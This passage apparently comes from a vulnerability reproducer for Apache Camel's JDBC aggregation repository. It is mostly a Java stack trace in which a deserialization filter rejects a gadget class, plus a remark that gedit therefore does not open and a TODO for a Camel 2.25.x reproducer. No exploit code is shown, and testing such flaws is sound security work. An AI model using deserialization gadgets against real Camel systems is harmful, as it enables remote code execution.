    at org.apache.camel.processor.aggregate.AggregateProcessor.doProcess(AggregateProcessor.java:360) ~[camel-core-processor-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.aggregate.AggregateProcessor.process(AggregateProcessor.java:316) ~[camel-core-processor-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.errorhandler.RedeliveryErrorHandler$SimpleTask.handleFirst(RedeliveryErrorHandler.java:462) ~[camel-core-processor-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.errorhandler.RedeliveryErrorHandler$SimpleTask.run(RedeliveryErrorHandler.java:438) ~[camel-core-processor-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.impl.engine.DefaultReactiveExecutor$Worker.doRun(DefaultReactiveExecutor.java:199) ~[camel-base-engine-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.impl.engine.DefaultReactiveExecutor$Worker.executeReactiveWork(DefaultReactiveExecutor.java:189) ~[camel-base-engine-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.impl.engine.DefaultReactiveExecutor$Worker.tryExecuteReactiveWork(DefaultReactiveExecutor.java:166) ~[camel-base-engine-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.impl.engine.DefaultReactiveExecutor$Worker.schedule(DefaultReactiveExecutor.java:148) ~[camel-base-engine-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.impl.engine.DefaultReactiveExecutor.scheduleMain(DefaultReactiveExecutor.java:59) ~[camel-base-engine-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.Pipeline.process(Pipeline.java:163) ~[camel-core-processor-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.impl.engine.CamelInternalProcessor.processNonTransacted(CamelInternalProcessor.java:354) ~[camel-base-engine-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.impl.engine.CamelInternalProcessor.process(CamelInternalProcessor.java:330) ~[camel-base-engine-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.component.timer.TimerConsumer.sendTimerExchange(TimerConsumer.java:293) ~[camel-timer-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.component.timer.TimerConsumer$1.doRun(TimerConsumer.java:164) ~[camel-timer-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.component.timer.TimerConsumer$1.run(TimerConsumer.java:136) ~[camel-timer-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at java.base/java.util.TimerThread.mainLoop(Timer.java:566) ~[na:na]  
    at java.base/java.util.TimerThread.run(Timer.java:516) ~[na:na]  
    Caused by: java.io.InvalidClassException: filter status: REJECTED  
    at java.base/java.io.ObjectInputStream.filterCheck(ObjectInputStream.java:1409) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:2044) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1898) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2224) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1733) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readObject(ObjectInputStream.java:509) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readObject(ObjectInputStream.java:467) ~[na:na]  
    at java.base/java.util.Hashtable.readHashtable(Hashtable.java:1313) ~[na:na]  
    at java.base/java.util.Hashtable.readObject(Hashtable.java:1259) ~[na:na]  
    at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na]  
    at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77) ~[na:na]  
    at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na]  
    at java.base/java.lang.reflect.Method.invoke(Method.java:568) ~[na:na]  
    at java.base/java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1100) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2423) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2257) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1733) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readObject(ObjectInputStream.java:509) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readObject(ObjectInputStream.java:467) ~[na:na]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcCamelCodec.decode(JdbcCamelCodec.java:104) ~[camel-sql-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcCamelCodec.unmarshallExchange(JdbcCamelCodec.java:77) ~[camel-sql-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcCamelCodec.unmarshallExchange(JdbcCamelCodec.java:72) ~[camel-sql-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcAggregationRepository$4.doInTransaction(JdbcAggregationRepository.java:359) ~[camel-sql-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    ... 23 common frames omitted  


The filter will reject the Gadget class and gedit won't open.

### TODO

Attempt to provide a Camel 2.25.x reproducer.
